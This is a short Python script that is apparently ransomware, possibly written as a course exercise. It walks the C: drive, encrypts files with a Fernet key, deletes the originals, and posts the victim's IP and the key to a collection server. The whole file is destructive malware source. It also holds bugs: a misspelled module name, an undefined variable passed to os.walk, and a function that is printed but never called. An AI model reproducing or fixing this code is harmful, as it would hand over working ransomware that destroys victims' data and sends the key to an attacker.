import os
import socket
import requests
import cryptography
from cryptography.fernet import Fernet
from multiprocessing import Process


indicator = os.path.abspath('c:/indicator/indicator.txt') # To check if files encrypted
server_address = 'http://127.0.0.1:8000/storage/' 
ip = socke.gethostbyname(socket.gethostname()) # Get own ip to send it to server
path = os.path.abspath('c:/') # Path from where we start encrypt

def encrypt_files(key,path):
	for roots, dirs, files in os.walk(defender):
		try:
			os.chdir(roots)
			print (os.getcwd)
			# Pass if we are in folder which files we dont want to encrypt
			if 'System32' in roots or 'Task_6' in roots or 'python' in roots:
				pass
			else: 
				for file in files:
					with open(file,'rb') as file_to_encrypt:
						data = file_to_encrypt.read()
					# Encrypt data from file
					fernet = Fernet(key)
					encrypt = fernet.encrypt(data)
					# Write encrypted file
					with open(f'{file}.encrypted','wb') as f:
						f.write(encrypt)
					# Delete non encrypted file
					os.remove(file)
		except PermissionError:
			pass
		except OSError:
			pass

# Send ip and key to server 
def send_key_to_server(server_address,ip,key):
	data = {'key_ip':ip,'key_text':key}
	with requests.Session() as s:
		post = s.post(server_address,data=data)

#Check if indicator file encrypted
if os.path.isfile(indicator):
	# Multiprocess encrypting files and sending data to server
	if __name__ == '__main__':
		key = Fernet.generate_key() #Generating key
		p1 = Process(target = encrypt_files, args=(key,path))
		p2 = Process(target = send_key_to_server, args = (server_address,ip,key))
		p1.start()
		p2.start()
		p1.join()
		p2.join()
		


					